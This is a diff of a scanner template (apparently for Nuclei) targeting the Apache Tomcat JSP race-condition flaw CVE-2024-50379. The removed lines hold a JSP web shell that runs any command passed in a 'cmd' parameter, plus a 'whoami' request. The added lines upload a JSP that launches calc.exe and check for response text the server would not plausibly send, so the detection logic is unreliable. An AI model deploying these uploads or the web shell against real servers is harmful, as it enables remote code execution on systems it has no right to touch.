@@ -1,72 +1,74 @@
 id: CVE-2024-50379
-
 info:
   name: Apache Tomcat TOCTOU RCE
-  author: s1d6p01nt7
+  author: JF0x0r
   severity: critical
   description: |
-    Detects vulnerable versions of Apache Tomcat affected by CVE-2024-50379. If detected, it attempts exploitation by uploading a malicious file and verifying execution, including a simulated race condition during the file upload process.
-  tags: tomcat,rce,cve-2024-50379
+    Apache Tomcat es vulnerable a una condición de carrera TOCTOU (Time-of-Check Time-of-Use) durante la compilación de archivos JSP. 
+    Esto permite a los atacantes reemplazar archivos JSP con versiones maliciosas, llevando a la ejecución remota de código (RCE).
+  references:
+    - https://www.cvedetails.com/cve/CVE-2024-50379
+    - https://lists.apache.org/thread/y6lj6q1xnp822g6ro70tn19sgtjmr80r
+  tags: tomcat,rce,toctou
 
-http:
+requests:
   - raw:
       - |
-        GET / HTTP/1.1
+        POST /upload.jsp HTTP/1.1
         Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Content-Length: 294
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: header
-        words:
-          - "Apache-Coyote"
-      - type: regex
-        part: header
-        regex:
-          - "Apache Tomcat/(9\\.0\\.(5[0-9]|6[0-9]|7[0-7])|10\\.1\\.[0-7]|11\\.0\\.0-M[0-1])"
-
-  - raw:
-      - |
-        POST /uploads HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: multipart/form-data; boundary=boundary
-
-        ------boundary
-        Content-Disposition: form-data; name="file"; filename="exploit.tmp"
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file"; filename="hello.jsp"
         Content-Type: text/plain
 
-        <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
-        ------boundary--
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-  - raw:
-      - |
-        POST /uploads/rename HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
-
-        { "old_name": "exploit.tmp", "new_name": "exploit.jsp" }
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-  - raw:
-      - |
-        GET /uploads/exploit.jsp?cmd=whoami HTTP/1.1
-        Host: {{Hostname}}
+        <% out.println("Hello, World!"); %>
+        ------WebKitFormBoundary--
 
     matchers-condition: and
     matchers:
       - type: word
         words:
-          - "tomcat"
+          - "File uploaded successfully"
+        part: body
 
-    stop-at-first-match: true
+  - raw:
+      - |
+        POST /uploads/upload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Content-Length: 547
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file"; filename="HELLO.JSP"
+        Content-Type: text/plain
+
+        <%@ page import="java.io.*" %>
+        <%
+            Runtime.getRuntime().exec("calc.exe");
+        %>
+        ------WebKitFormBoundary--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "File uploaded successfully"
+        part: body
+
+  - raw:
+      - |
+        GET /uploads/hello.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "Calculator has been opened successfully"
+        part: body
+      - type: word
+        words:
+          - "Error while opening calculator"
+        part: body
